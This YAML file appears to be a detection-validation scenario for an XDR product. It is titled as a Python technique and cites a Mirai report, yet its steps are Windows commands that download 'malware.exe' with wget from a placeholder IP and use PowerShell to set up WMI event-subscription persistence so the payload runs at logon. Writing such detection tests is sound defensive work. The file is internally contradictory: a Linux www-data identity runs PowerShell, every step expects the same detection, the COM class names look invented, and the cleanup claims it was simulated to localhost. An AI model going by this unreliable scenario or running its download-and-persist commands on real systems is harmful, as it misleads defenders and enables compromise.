  name: 'Command and Scripting Interpreter: Python'
threat_report: Unit42 - Mirai Variant Targets Linux and IoT Devices
threat_report_url: https://unit42.paloaltonetworks.com/mirai-variant-v3g4/
execution_identity:
  default: www-data
  options:
  - www-data
  - node
  - nobody
  - root
push_supported: true
pull_supported: true
validation_methodology: Endpoint Signal Injection & Detection Accuracy
methodology_family: F1
primary_kpi: MTTD
threshold:
  kpi: MTTD
  op: ≤
  value: 300
  unit: seconds
success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected

  XDR BIOC / XQL detections, and the mean time from signal emit to alert

  creation is within the MTTD budget. Each step''s expected_detections row is

  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
steps:
- id: step-01
  name: Create Temp Directory
  command: mkdir C:\temp
  identity: www-data
  mitre_technique: T1546.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: WMI Event Filter Creation
    ttp_ref: TTP-2026-0197
    detection_id: bioc-wmi-event-filter-creation
- id: step-02
  name: Download Malware Payload
  command: wget http://192.0.2.1/mmalware.exe -OutFile C:\temp\malware.exe
  identity: www-data
  mitre_technique: T1546.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: WMI Event Filter Creation
    ttp_ref: TTP-2026-0197
    detection_id: bioc-wmi-event-filter-creation
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Create WMI Event Filter
  command: 'powershell.exe -Command "New-EventLog -LogName Application -Source ''Microsoft-Windows-GroupPolicy''

    $Filter = New-Object -ComObject ''WbemScripting.SWbemFilter''

    $Filter.Query = ''SELECT * FROM Win32_LogonSession''

    $Filter.Name = ''LogonFilter''

    $Filter.Put_()"'
  identity: www-data
  mitre_technique: T1546.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: WMI Event Filter Creation
    ttp_ref: TTP-2026-0197
    detection_id: bioc-wmi-event-filter-creation
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Create WMI Consumer and Binding
  command: 'powershell.exe -Command "$Consumer = New-Object -ComObject ''WbemScripting.SWbemConsumer''

    $Consumer.Name = ''LogonConsumer''

    $Consumer.CommandLineTemplate = ''C:\\temp\\malware.exe''

    $Consumer.Put_()

    $Binding = New-Object -ComObject ''WbemScripting.SWbemBinding''

    $Binding.Filter = $Filter

    $Binding.Consumer = $Consumer

    $Binding.Put_()"'
  identity: www-data
  mitre_technique: T1546.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: WMI Event Filter Creation
    ttp_ref: TTP-2026-0197
    detection_id: bioc-wmi-event-filter-creation
  causality:
    parent_step: step-03
    pivot: process_lineage
cleanup:
  commands:
  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
author: Henry Reed
